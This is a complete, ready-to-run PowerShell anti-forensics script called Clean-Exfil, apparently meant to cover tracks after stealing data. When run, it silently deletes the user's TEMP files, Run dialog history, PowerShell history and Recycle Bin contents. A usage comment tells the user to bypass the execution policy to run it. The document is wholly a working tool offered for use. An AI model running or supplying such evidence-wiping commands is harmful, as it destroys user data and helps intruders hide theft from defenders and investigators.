## Usage
## .\Clean-Exfil
## If you get execution policy errors, use powershell -ExecutionPolicy Bypass -File .\Clean-Exfil.ps1

function Clean-Exfil { 

    <#
    .SYNOPSIS
        Cleans common traces from the current user’s environment.
    
    .DESCRIPTION
        This function clears the TEMP folder, Run dialog history, 
        PowerShell history, and empties the Recycle Bin.
    
    .EXAMPLE
        Clean-Exfil
    #>

    # Empty temp folder
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

    # Delete run box history
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f | Out-Null

    # Delete PowerShell history (if it exists)
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
    }

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Call the function automatically when script runs
Clean-Exfil
